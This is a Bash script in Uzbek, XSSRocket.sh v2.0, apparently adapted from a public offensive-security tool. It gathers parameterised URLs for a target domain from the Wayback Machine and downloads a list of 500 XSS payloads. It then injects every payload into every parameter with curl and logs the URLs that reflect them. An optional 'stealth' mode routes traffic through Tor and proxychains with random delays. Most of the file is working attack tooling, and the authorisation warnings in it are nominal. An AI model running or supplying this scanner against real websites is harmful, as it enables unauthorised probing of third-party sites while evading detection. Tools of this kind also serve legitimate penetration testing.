#!/bin/bash
# ============================================================
# XSSRocket.sh - v2.0 (O'zbekcha versiya)
# Muallif: Chris 'SaintDruG' Abou-Chabké
# Maqsad: Faqat ta'lim va ruxsat berilgan tizimlarni sinash uchun
# ============================================================

# ─── Ranglar ────────────────────────────────────────────────
RED='\033[0;31m'
GREEN='\033[0;32m'
YELLOW='\033[1;33m'
CYAN='\033[0;36m'
BOLD='\033[1m'
RESET='\033[0m'

# ─── Yordamchi funksiyalar ───────────────────────────────────
info()    { echo -e "${CYAN}[*]${RESET} $1"; }
success() { echo -e "${GREEN}[+]${RESET} $1"; }
warning() { echo -e "${YELLOW}[!]${RESET} $1"; }
error()   { echo -e "${RED}[-]${RESET} $1"; }
banner()  { echo -e "${BOLD}${CYAN}$1${RESET}"; }

# ─── Banner ─────────────────────────────────────────────────
clear
banner "
██╗  ██╗███████╗███████╗    ██████╗  ██████╗  ██████╗██╗  ██╗███████╗████████╗
╚██╗██╔╝██╔════╝██╔════╝    ██╔══██╗██╔═══██╗██╔════╝██║ ██╔╝██╔════╝╚══██╔══╝
 ╚███╔╝ ███████╗███████╗    ██████╔╝██║   ██║██║     █████╔╝ █████╗     ██║
 ██╔██╗ ╚════██║╚════██║    ██╔══██╗██║   ██║██║     ██╔═██╗ ██╔══╝     ██║
██╔╝ ██╗███████║███████║    ██║  ██║╚██████╔╝╚██████╗██║  ██╗███████╗   ██║
╚═╝  ╚═╝╚══════╝╚══════╝    ╚═╝  ╚═╝ ╚═════╝  ╚═════╝╚═╝  ╚═╝╚══════╝   ╚═╝
"
echo -e "${YELLOW}  v2.0 | Faqat ta'lim maqsadida | blackhatethicalhacking.com${RESET}"
echo -e "${RED}  OGOHLANTIRISH: Bu vositani faqat ruxsat berilgan tizimlarda ishlating!${RESET}"
echo ""

# ─── Sun Tzu iqtiboslari (o'zbekcha) ────────────────────────
quotes=(
  "Urushning oliy san'ati — raqibni jang qilmasdan bo'ysundirish."
  "Har qanday urush aldashga asoslanadi."
  "Qachon jang qilishni va qachon qilmaslikni bilgan g'alaba qozonadi."
  "Raqibni chalkashtirib, haqiqiy niyatingni yashir."
  "Yuz jangda yuz g'alaba mahorat emas. Jang qilmasdan g'alaba — mana haqiqiy mahorat."
)
random_quote="${quotes[$RANDOM % ${#quotes[@]}]}"
echo -e "${CYAN}💡 Sun Tzu: \"$random_quote\"${RESET}"
echo ""

# ─── Muhim eslatma ──────────────────────────────────────────
warning "SMTP sozlamalarini o'zgartirmasangiz, email orqali natija ololmaysiz."
warning "Bepul test uchun mailtrap.io dan foydalaning va manba kodidagi ma'lumotlarni o'zgartiring."
echo ""

# ─── Internet aloqasini tekshirish ─────────────────────────
info "Internet ulanishini tekshirmoqda..."
if ! wget -q --spider --timeout=10 https://google.com 2>/dev/null; then
    error "Internet ulanishi topilmadi! XSSRocket.sh ni ishlatishdan oldin internetga ulaning."
    exit 1
fi
success "Internet ulanishi mavjud. Davom etamiz!"
echo ""

# ─── Dependency tekshiruvi va o'rnatish ─────────────────────
install_package() {
    local pkg="$1"
    info "'$pkg' o'rnatilmoqda..."
    if command -v apt-get &>/dev/null; then
        sudo apt-get install -y "$pkg" &>/dev/null
    elif command -v dnf &>/dev/null; then
        sudo dnf install -y "$pkg" &>/dev/null
    elif command -v yum &>/dev/null; then
        sudo yum install -y "$pkg" &>/dev/null
    elif command -v pacman &>/dev/null; then
        sudo pacman -S --noconfirm "$pkg" &>/dev/null
    else
        error "Paket menejeri topilmadi. '$pkg' ni qo'lda o'rnating."
        exit 1
    fi
}

check_and_install() {
    local cmd="$1"
    local pkg="${2:-$1}"
    if ! command -v "$cmd" &>/dev/null; then
        warning "'$cmd' topilmadi."
        install_package "$pkg"
        if command -v "$cmd" &>/dev/null; then
            success "'$cmd' muvaffaqiyatli o'rnatildi."
        else
            error "'$cmd' o'rnatilmadi. Qo'lda o'rnating: $pkg"
            exit 1
        fi
    else
        success "'$cmd' mavjud."
    fi
}

banner "─── Kerakli dasturlarni tekshirish ───"

# Asosiy dasturlar
check_and_install "curl"
check_and_install "wget"
check_and_install "pv"
check_and_install "figlet"

# lolcat (ixtiyoriy — ishlamasa o'tkazib yuboriladi)
if ! command -v lolcat &>/dev/null; then
    warning "'lolcat' topilmadi. Oddiy ranglar ishlatiladi."
fi

# waybackurls — Go orqali o'rnatish
if ! command -v waybackurls &>/dev/null; then
    warning "'waybackurls' topilmadi. O'rnatilmoqda..."
    if command -v go &>/dev/null; then
        go install github.com/tomnomnom/waybackurls@latest &>/dev/null
        export PATH="$PATH:$(go env GOPATH)/bin"
        if command -v waybackurls &>/dev/null; then
            success "'waybackurls' o'rnatildi."
        else
            error "'waybackurls' o'rnatilmadi. Go PATH ni tekshiring: export PATH=\$PATH:\$(go env GOPATH)/bin"
            exit 1
        fi
    else
        error "Go o'rnatilmagan. Avval Go ni o'rnating: https://go.dev/doc/install"
        error "So'ng: go install github.com/tomnomnom/waybackurls@latest"
        exit 1
    fi
else
    success "'waybackurls' mavjud."
fi

echo ""

# ─── Email sozlamalari ───────────────────────────────────────
echo -e "${CYAN}Natijalarni email orqali olishni xohlaysizmi? (y/n): ${RESET}"
read -r send_email

user_email=""
smtp_url="smtp.mailtrap.io"
smtp_port="2525"
smtp_username="SMTP_USERNAME"
smtp_password="SMTP_PASSWORD"
smtp_from="xssrocket@yourdomain.com"

if [[ "$send_email" == "y" ]]; then
    echo -e "${CYAN}Email manzilingizni kiriting: ${RESET}"
    read -r user_email
    if [[ -z "$user_email" || ! "$user_email" =~ ^[^@]+@[^@]+\.[^@]+$ ]]; then
        warning "Noto'g'ri email formati. Email yuborilmaydi."
        send_email="n"
    fi
fi

# ─── Kiritilgan formatni aniqlash (python) ───────────────────
detect_input_format() {
    python3 - "$1" <<'PYEOF'
import sys
import re
from urllib.parse import urlparse

raw = sys.argv[1].strip()

# 1) Fayl yo'li — mavjud fayl
import os
if os.path.isfile(raw):
    print("file:" + raw)
    sys.exit()

# 2) Protokol bilan to'liq URL — https://... yoki http://...
if re.match(r'^https?://', raw):
    p = urlparse(raw)
    if p.query:
        # Parametri bor → bitta URL rejimi
        print("url:" + raw)
    elif p.path and p.path not in ('', '/'):
        # Path bor lekin parametr yo'q → wayback + path filtri
        # format: wayback_path:<netloc>|<path>|<scheme>
        print("wayback_path:" + p.netloc + "|" + p.path + "|" + p.scheme)
    else:
        # Faqat domen
        print("domain:" + p.netloc)
    sys.exit()

# 3) Protokolsiz ikki chiziq — //example.com
if raw.startswith('//'):
    p = urlparse('https:' + raw)
    if p.query:
        print("url:https:" + raw)
    elif p.path and p.path not in ('', '/'):
        print("wayback_path:" + p.netloc + "|" + p.path + "|https")
    else:
        print("domain:" + p.netloc)
    sys.exit()

# 4) IP:port yoki domain:port — 192.168.1.1:8080 / example.com:8080
if re.match(r'^(\d{1,3}\.){3}\d{1,3}(:\d+)?$', raw) or \
   re.match(r'^[a-zA-Z0-9._-]+:\d{2,5}$', raw):
    print("domain:" + raw)
    sys.exit()

# 5) Oddiy domen — example.com yoki sub.example.co.uk
if re.match(r'^[a-zA-Z0-9][a-zA-Z0-9._-]*\.[a-zA-Z]{2,}$', raw):
    print("domain:" + raw)
    sys.exit()

# 6) Protokolsiz lekin path/parametr bor — example.com/page?q=1
if '?' in raw:
    print("url:https://" + raw)
    sys.exit()
if '/' in raw:
    p = urlparse('https://' + raw)
    if p.path and p.path not in ('', '/'):
        print("wayback_path:" + p.netloc + "|" + p.path + "|https")
    else:
        print("domain:" + p.netloc)
    sys.exit()

# 7) Noma'lum — domen deb qabul qilamiz
print("domain:" + raw)
PYEOF
}

# ─── Target kiriting ─────────────────────────────────────────
echo ""
echo -e "${CYAN}Maqsadni kiriting:${RESET}"
echo -e "  ${YELLOW}•${RESET} Domen         →  example.com"
echo -e "  ${YELLOW}•${RESET} Protokol bilan →  https://example.com"
echo -e "  ${YELLOW}•${RESET} To'liq URL     →  https://example.com/page?q=1"
echo -e "  ${YELLOW}•${RESET} IP yoki port   →  192.168.1.1:8080"
echo -e "  ${YELLOW}•${RESET} URL fayli      →  /home/user/urls.txt"
echo -ne "${CYAN}➜ ${RESET}"
read -r raw_input

if [[ -z "$raw_input" ]]; then
    error "Hech narsa kiritilmadi. Chiqilmoqda."
    exit 1
fi

# Formatni aniqla
detected=$(detect_input_format "$raw_input")
input_type="${detected%%:*}"
input_value="${detected#*:}"

case "$input_type" in
    domain)
        domain="$input_value"
        scan_mode="wayback"
        wayback_path_filter=""
        success "Aniqlandi: Domen → ${BOLD}$domain${RESET} (Wayback Machine orqali to'liq URL yig'iladi)"
        ;;
    wayback_path)
        # format: netloc|path|scheme
        IFS='|' read -r _netloc _path _scheme <<< "$input_value"
        domain="$_netloc"
        scan_mode="wayback"
        wayback_path_filter="$_path"
        wayback_scheme="${_scheme:-https}"
        success "Aniqlandi: Path bilan domen → ${BOLD}${wayback_scheme}://${domain}${wayback_path_filter}${RESET}"
        info "Wayback natijalar faqat '${BOLD}${wayback_path_filter}${RESET}' yo'li bo'yicha filtrlanadi"
        ;;
    url)
        domain=$(python3 -c "from urllib.parse import urlparse; print(urlparse('$input_value').netloc)" 2>/dev/null)
        [[ -z "$domain" ]] && domain="$raw_input"
        scan_mode="single_url"
        single_url="$input_value"
        wayback_path_filter=""
        success "Aniqlandi: To'g'ridan-to'g'ri URL → ${BOLD}$input_value${RESET}"
        ;;
    file)
        domain=$(basename "$input_value" | tr -cd '[:alnum:]-_')
        [[ -z "$domain" ]] && domain="custom_scan"
        scan_mode="file"
        url_file_input="$input_value"
        wayback_path_filter=""
        success "Aniqlandi: URL fayli → ${BOLD}$input_value${RESET} ($(wc -l < "$input_value") qator)"
        ;;
    *)
        domain="$raw_input"
        scan_mode="wayback"
        wayback_path_filter=""
        warning "Format aniqlanmadi, domen sifatida qabul qilindi: $domain"
        ;;
esac

# Domen nomini papka uchun tozalash
clean_domain=$(echo "$domain" | tr -cd '[:alnum:]-_.\n' | cut -c1-60)

# ─── Natijalar papkasini tayyorlash ──────────────────────────
results_dir="${clean_domain}_xss_results"
mkdir -p "$results_dir"

param_urls_file="$results_dir/param_urls.txt"
affected_urls_file="$results_dir/affected_urls.txt"
scan_log="$results_dir/scan_log.txt"

touch "$param_urls_file" "$affected_urls_file" "$scan_log"

info "Natijalar → '$results_dir/' papkasiga saqlanadi."

# ─── Stealth rejimi ──────────────────────────────────────────
echo ""
echo -e "${CYAN}Stealth (yashirin) rejimda ishlashni xohlaysizmi? (y/n): ${RESET}"
read -r stealth_attack

use_proxy=""
if [[ "$stealth_attack" == "y" ]]; then
    check_and_install "proxychains4" "proxychains4"
    if ! systemctl is-active --quiet tor 2>/dev/null; then
        check_and_install "tor"
        sudo systemctl start tor
        sleep 3
    fi
    use_proxy="proxychains4 -q"
    info "Stealth rejim yoqildi. Proxychains ishlatiladi."
else
    info "Stealth rejim o'chirildi."
fi

# ─── URL larni yig'ish (scan_mode ga qarab) ─────────────────
echo ""

if [[ -s "$param_urls_file" ]]; then
    warning "Avvalgi URL ro'yxati topildi. Qayta ishlatilmoqda. (Tozalash uchun '$param_urls_file' ni o'chiring)"
else
    case "$scan_mode" in

        wayback)
            if [[ -n "$wayback_path_filter" ]]; then
                info "'${domain}${wayback_path_filter}' uchun Wayback Machine dan URL lar yig'ilmoqda (path filtri: ${wayback_path_filter}*)..."
            else
                info "'$domain' uchun Wayback Machine dan URL lar yig'ilmoqda..."
            fi
            $use_proxy waybackurls "$domain" 2>/dev/null \
                | grep -E '\?[a-zA-Z0-9_]+=' \
                | (
                    if [[ -n "$wayback_path_filter" ]]; then
                        # Faqat kiritilgan path bilan boshlanuvchi URL larni olish
                        grep -F "$wayback_path_filter"
                    else
                        cat
                    fi
                  ) \
                | sort -u \
                > "$param_urls_file"
            ;;

        single_url)
            info "Bitta URL skanlanadi: $single_url"
            # URL normalize qilish va faylga yozish
            python3 - "$single_url" >> "$param_urls_file" <<'PYEOF'
import sys
from urllib.parse import urlparse, unquote
raw = sys.argv[1].strip()
if not raw.startswith(('http://', 'https://')):
    raw = 'https://' + raw
p = urlparse(raw)
if p.query:
    print(raw)
PYEOF
            ;;

        file)
            info "'$url_file_input' faylidan URL lar o'qilmoqda..."
            # Fayldagi URL larni normalize qilib param_urls_file ga yozish
            python3 - "$url_file_input" >> "$param_urls_file" <<'PYEOF'
import sys
from urllib.parse import urlparse, unquote
with open(sys.argv[1]) as fh:
    for line in fh:
        raw = line.strip()
        if not raw or raw.startswith('#'):
            continue
        if not raw.startswith(('http://', 'https://')):
            raw = 'https://' + raw
        p = urlparse(raw)
        if p.query:
            print(raw)
PYEOF
            ;;
    esac
fi

url_count=$(wc -l < "$param_urls_file")
if [[ "$url_count" -eq 0 ]]; then
    warning "Parametrli URL topilmadi. Domenni tekshiring yoki keyinroq urinib ko'ring."
    exit 0
fi
success "$url_count ta parametrli URL topildi."

# ─── Payload faylini yuklash ─────────────────────────────────
payload_file="xss-payload-list.txt"
payload_url="https://raw.githubusercontent.com/blackhatethicalhacking/XSSRocket/main/top-500-xss-payloads.txt"

if [[ ! -s "$payload_file" ]]; then
    info "Payload ro'yxati yuklanmoqda..."
    if wget -q "$payload_url" -O "$payload_file"; then
        success "Payload ro'yxati yuklandi: $(wc -l < "$payload_file") ta payload."
    else
        error "Payload ro'yxatini yuklab bo'lmadi: $payload_url"
        exit 1
    fi
else
    success "Mavjud payload ro'yxati ishlatilmoqda: $(wc -l < "$payload_file") ta payload."
fi

# ─── Skanerlash ─────────────────────────────────────────────
echo ""
banner "─── XSS Skanerlash boshlandi ───"
info "Muvaffaqiyatli XSS aniqlanganda ekranda ko'rsatiladi."
echo ""

counter=0
scanned=0

# URL larni normalize qilib, parametr qiymatlarini XSSTEST bilan almashtirish
mapfile -t urls < <(
    python3 - "$param_urls_file" <<'PYEOF'
import sys
from urllib.parse import (
    urlparse, urlunparse, parse_qs, urlencode,
    unquote, unquote_plus, quote
)

def normalize_url(raw):
    """
    Turli formatlardagi URL larni normallashtiradi:
      - Protokolsiz: example.com/p?q=1  → https://example.com/p?q=1
      - Protokol-relative: //example.com → https://example.com
      - Encoded query: ?q=%3Cscript%3E   → to'g'ri parse qilinadi
      - Semicolon param: ?a=1;b=2        → {a:1, b:2}
      - Fragment param: #!q=1 / #?q=1   → query sifatida olinadi
    """
    raw = raw.strip()
    if not raw or raw.startswith('#'):
        return None

    # Protokolsiz (//) holda
    if raw.startswith('//'):
        raw = 'https:' + raw

    # Protokol yo'q lekin host bor
    if not raw.startswith(('http://', 'https://')):
        raw = 'https://' + raw

    try:
        p = urlparse(raw)
    except Exception:
        return None

    # Query string — encoded bo'lsa ham to'g'ri parse qilinadi
    query = p.query or ''

    # Semicolon separator: ?a=1;b=2 → a=1&b=2
    query = query.replace(';', '&')

    # Fragment ichida ham parametr bo'lishi mumkin: #?q=1 yoki #!/path?q=1
    fragment = p.fragment or ''
    if '?' in fragment:
        frag_query = fragment.split('?', 1)[1]
        query = (query + '&' + frag_query).strip('&')
    elif fragment.startswith('!') and '=' in fragment:
        frag_query = fragment[1:]
        query = (query + '&' + frag_query).strip('&')

    if not query:
        return None

    try:
        params = parse_qs(query, keep_blank_values=True)
    except Exception:
        return None

    if not params:
        return None

    # Barcha qiymatlarni XSSTEST bilan almashtirish
    new_params = {k: ['XSSTEST'] for k in params}
    new_query = urlencode(new_params)

    result = urlunparse((
        p.scheme or 'https',
        p.netloc,
        p.path,
        p.params,
        new_query,
        ''          # fragment olib tashlanadi
    ))
    return result

seen = set()
with open(sys.argv[1]) as fh:
    for line in fh:
        result = normalize_url(line)
        if result and result not in seen:
            seen.add(result)
            print(result)
PYEOF
)

total_payloads=$(grep -c '' "$payload_file" 2>/dev/null || echo 0)
total_urls=${#urls[@]}
total_requests=$(( total_payloads * total_urls ))

# ─── Progress bar funksiyasi ─────────────────────────────────
draw_progress() {
    local current=$1
    local total=$2
    local found=$3
    local bar_width=40
    local filled=$(( current * bar_width / (total > 0 ? total : 1) ))
    local empty=$(( bar_width - filled ))
    local bar=""
    local i
    for (( i=0; i<filled; i++ )); do bar+="█"; done
    for (( i=0; i<empty; i++ )); do bar+="░"; done
    local pct=$(( current * 100 / (total > 0 ? total : 1) ))
    printf "\r  ${CYAN}[%s]${RESET} %3d%% | So'rovlar: ${BOLD}%d/%d${RESET} | Topildi: ${GREEN}%d${RESET}  " \
        "$bar" "$pct" "$current" "$total" "$found"
}

echo ""

while IFS= read -r payload; do
    # Bo'sh qator va izohlarni o'tkazib yuborish
    [[ -z "$payload" || "$payload" == \#* ]] && continue

    for base_url in "${urls[@]}"; do
        # Bash ichki string almashtirish — sed yo'q, maxsus belgilar muammo emas
        test_url="${base_url//XSSTEST/$payload}"

        # Bitta curl chaqiruvida ham javob matni ham HTTP kod olinadi
        response_with_code=$($use_proxy curl -sk --max-time 10 \
            -w "\n##HTTPCODE##%{http_code}" \
            --url "$test_url" 2>/dev/null)

        http_code="${response_with_code##*##HTTPCODE##}"
        response="${response_with_code%$'\n'##HTTPCODE##*}"

        scanned=$(( scanned + 1 ))

        # XSS aniqlash: payload RAW holda javobda qaytgan bo'lsa
        if grep -qF "$payload" <<< "$response" 2>/dev/null; then
            # Progress barni tozalab, natijani ko'rsatish
            printf "\r%-80s\r" " "
            success "XSS TOPILDI! ➜ ${BOLD}$test_url${RESET}"
            echo "$test_url" >> "$affected_urls_file"
            printf "[%s] VULNERABLE | %s | Payload: %s\n" \
                "$(date '+%Y-%m-%d %H:%M:%S')" "$test_url" "$payload" >> "$scan_log"
            counter=$(( counter + 1 ))
        fi

        # HTTP 500 ni faqat logga yozish
        if [[ "$http_code" == "500" ]]; then
            printf "[%s] HTTP 500 | %s\n" \
                "$(date '+%Y-%m-%d %H:%M:%S')" "$test_url" >> "$scan_log"
        fi

        # Progress barni yangilash (har 5 so'rovda bir)
        if (( scanned % 5 == 0 )); then
            draw_progress "$scanned" "$total_requests" "$counter"
        fi
    done

    # Stealth rejim uchun kechikish
    if [[ "$stealth_attack" == "y" ]]; then
        sleep $(( RANDOM % 3 + 1 ))
    fi

done < "$payload_file"

# Oxirgi progress holatini ko'rsatish
draw_progress "$scanned" "$total_requests" "$counter"
echo ""

# ─── Natijalar xulosasi ──────────────────────────────────────
echo ""
banner "─── Skanerlash yakunlandi ───"
echo ""

if [[ -s "$affected_urls_file" ]]; then
    found=$(wc -l < "$affected_urls_file")
    success "Jami $found ta XSS zaifligi topildi!"
    echo ""
    echo -e "${BOLD}Zaif URL lar:${RESET}"
    cat "$affected_urls_file"
    summary="Jami $found ta XSS zaifligi topildi.\n\nZaif URL lar:\n$(cat "$affected_urls_file")"
else
    warning "Hech qanday XSS zaifligi topilmadi."
    summary="Skanerlash tugadi. '$domain' domenida XSS zaifligi topilmadi."
fi

echo ""
info "Batafsil logllar: $scan_log"
info "Zaif URL lar: $affected_urls_file"

# ─── Email yuborish ──────────────────────────────────────────
if [[ "$send_email" == "y" && -n "$user_email" ]]; then
    info "Natijalar $user_email ga yuborilmoqda..."

    if [[ "$smtp_username" == "SMTP_USERNAME" ]]; then
        warning "SMTP ma'lumotlari o'rnatilmagan. Email yuborilmadi."
        warning "Manba kodidagi smtp_username va smtp_password ni o'zgartiring."
    else
        curl --silent \
            --url "smtp://$smtp_url:$smtp_port" \
            --ssl-reqd \
            --mail-from "$smtp_from" \
            --mail-rcpt "$user_email" \
            --upload-file <(printf "From: XSSRocket <%s>\nTo: %s\nSubject: XSS Skan natijalari — %s\n\n%b" \
                "$smtp_from" "$user_email" "$domain" "$summary") \
            --user "$smtp_username:$smtp_password"

        if [[ $? -eq 0 ]]; then
            success "Email muvaffaqiyatli yuborildi: $user_email"
        else
            error "Email yuborishda xatolik yuz berdi."
        fi
    fi
fi

# ─── Yakuniy xabar ──────────────────────────────────────────
echo ""
success "XSSRocket.sh dan foydalanganingiz uchun rahmat!"
warning "Eslatma: Bu vositani FAQAT ruxsat berilgan tizimlarda ishlating!"
